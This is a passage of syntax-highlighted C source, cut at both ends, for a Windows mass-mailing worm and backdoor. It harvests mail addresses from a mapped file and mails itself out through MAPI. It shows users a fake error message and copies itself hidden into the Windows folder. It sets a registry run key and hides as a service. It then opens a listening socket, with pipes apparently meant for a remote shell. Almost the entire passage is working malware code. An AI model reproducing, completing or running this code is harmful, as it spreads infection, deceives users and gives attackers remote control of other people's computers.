    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">session</span><span class="sc10">)!=</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* open a small file */</span><span class="sc0">
 </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_BSWAP</span><span class="sc10">],</span><span class="sc11">GENERIC_READ</span><span class="sc10">|</span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
         </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">OPEN_ALWAYS</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_TEMPORARY</span><span class="sc10">|</span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* and map it with 10 mbs of size */</span><span class="sc0">
 </span><span class="sc11">fmobj</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0xa00000</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc11">lpobj</span><span class="sc10">=(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">fmobj</span><span class="sc10">,</span><span class="sc11">FILE_MAP_WRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* scan it for mail addrr */</span><span class="sc0">
 </span><span class="sc11">file</span><span class="sc10">=</span><span class="sc11">lpobj</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">size</span><span class="sc10">=(</span><span class="sc4">0xa00000</span><span class="sc10">-</span><span class="sc4">0x10</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mailto</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_SMTP</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc11">destination</span><span class="sc10">.</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">mailto</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc1">/* nice loop */</span><span class="sc0">
 </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">ScanMailto</span><span class="sc10">(&amp;</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">mailto</span><span class="sc10">+</span><span class="sc4">5</span><span class="sc10">,&amp;</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">mbody</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mailto</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_SMTP</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">lpobj</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fmobj</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* log out and unload libraries */</span><span class="sc0">
 </span><span class="sc10">(</span><span class="sc11">MLogoff</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_BSWAP</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* unload socks at exit */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">cleanAll</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* the backdoor is the main module coz it will run in an end-less loop */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sfd</span><span class="sc10">,</span><span class="sc11">nsfd</span><span class="sc10">,</span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">ser_addr</span><span class="sc10">,</span><span class="sc11">cli_addr</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsadata</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nbytes</span><span class="sc10">,</span><span class="sc11">cli_len</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">cli_addr</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">inbyt</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">resdw</span><span class="sc10">,</span><span class="sc11">resultdw</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">pinfo</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">sinfo</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">fd_set</span><span class="sc0"> </span><span class="sc11">readfds</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">timev</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">LPTSTR</span><span class="sc0"> </span><span class="sc11">commandLine</span><span class="sc10">,</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hkey</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ThreadId</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">k32</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">RSP</span><span class="sc0"> </span><span class="sc11">RegSerPro</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">connection</span><span class="sc10">,</span><span class="sc11">quiet</span><span class="sc10">,</span><span class="sc11">install</span><span class="sc10">,</span><span class="sc11">mspawn</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">

 </span><span class="sc1">/*
     check execution mode:

     -q   quiet (no stealth message, no install, mail infection)
     -i   install (no stealth message, install)
     -m   mail spawn (quiet mode, mail infection)

     Default mode: stealth message, install

 */</span><span class="sc0">
 </span><span class="sc11">install</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">quiet</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">mspawn</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">commandLine</span><span class="sc10">=</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">commandLine</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">=</span><span class="sc11">commandLine</span><span class="sc10">;</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'-'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">ptr</span><span class="sc10">++);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'-'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'q'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">quiet</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">install</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'i'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">quiet</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">install</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'m'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">quiet</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">install</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">mspawn</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* generate a fake message in user lenguage */</span><span class="sc0">
 </span><span class="sc1">/* try to load the 0.0.0.0.dll hehehe */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">quiet</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_STDADDR</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc11">FormatMessage</span><span class="sc10">(</span><span class="sc11">FORMAT_MESSAGE_FROM_SYSTEM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">GetLastError</span><span class="sc10">(),</span><span class="sc0">
                </span><span class="sc11">MAKELANGID</span><span class="sc10">(</span><span class="sc11">LANG_NEUTRAL</span><span class="sc10">,</span><span class="sc11">SUBLANG_DEFAULT</span><span class="sc10">),&amp;</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* this should be used in sending files also */</span><span class="sc0">
 </span><span class="sc1">/* that's why filename is a global var */</span><span class="sc0">
 </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc1">/* installation code */</span><span class="sc0">
 </span><span class="sc1">/* copy it to windows folder and register it as service */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">install</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_DAEMON</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                        </span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">" -q"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_REGKEY</span><span class="sc10">],</span><span class="sc0">
                        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hkey</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_REGNAME</span><span class="sc10">],</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc1">/* wait to next boot to run */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* hide current process as service */</span><span class="sc0">
 </span><span class="sc11">k32</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_KERNEL32</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">RegSerPro</span><span class="sc10">=(</span><span class="sc11">RSP</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_RSP</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegSerPro</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">RegSerPro</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* check for inet connection */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">iconnected</span><span class="sc10">())</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc1">/* run mail spread routine */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mspawn</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">resdw</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* disable wait */</span><span class="sc0">
        </span><span class="sc1">/* and end work here */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">SpawnMail</span><span class="sc10">((</span><span class="sc11">LPVOID</span><span class="sc10">)(&amp;</span><span class="sc11">resdw</span><span class="sc10">));</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* run mail spread routine in a new thread */</span><span class="sc0">
 </span><span class="sc11">resdw</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* enable wait */</span><span class="sc0">
 </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">SpawnMail</span><span class="sc10">,(</span><span class="sc11">LPVOID</span><span class="sc10">)(&amp;</span><span class="sc11">resdw</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">ThreadId</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* create 2 pipes */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">CreatePipe</span><span class="sc10">(&amp;</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],&amp;</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">CreatePipe</span><span class="sc10">(&amp;</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],&amp;</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc1">/* start up socks */</span><span class="sc0">
 </span><span class="sc11">result</span><span class="sc10">=</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">),&amp;</span><span class="sc11">wsadata</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(!</span><span class="sc11">result</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc11">atexit</span><span class="sc10">(</span><span class="sc11">cleanAll</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">LOBYTE</span><span class="sc10">(</span><span class="sc11">wsadata</span><span class="sc10">.</span><span class="sc11">wVersion</span><span class="sc10">)!=</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">HIBYTE</span><span class="sc10">(</span><span class="sc11">wsadata</span><span class="sc10">.</span><span class="sc11">wVersion</span><span class="sc10">)!=</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(</span><span class="sc11">LOBYTE</span><span class="sc10">(</span><span class="sc11">wsadata</span><span class="sc10">.</span><span class="sc11">wVersion</span><span class="sc10">)==</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(</span><span class="sc11">HIBYTE</span><span class="sc10">(</span><span class="sc11">wsadata</span><span class="sc10">.</span><span class="sc11">wVersion</span><span class="sc10">)==</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">sfd</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">==</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">ser_addr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc10">=</span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">ser_addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">=</span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_STDADDR</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc1">/* pseudo random port RSH_STDPORT + rnd(256) */</span><span class="sc0">
 </span><span class="sc11">ser_addr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">=</span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">RSH_STDPORT</span><span class="sc10">+(</span><span class="sc4">0xff</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">()));</span><span class="sc0">

 </span><span class="sc11">result</span><span class="sc10">=</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">ser_addr</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ser_addr</span><span class="sc10">));</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">==-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">!=-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">,</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc1">/* main loop */</span><span class="sc0">
 </span><span class="sc5">for</span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

 </span><span class="sc11">nsfd</span><span class="sc10">=</span><span class="sc11">accept</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">cli_addr</span><span class="sc10">,&amp;</span><span class="sc11">cli_len</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">==</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">assert</span><span class="sc10">(</span><span class="sc11">sfd</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">nbytes</span><span class="sc10">=</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_VERSION</span><span class="sc10">],</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_VERSION</span><span class="sc10">]),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nbytes</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_VERSION</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
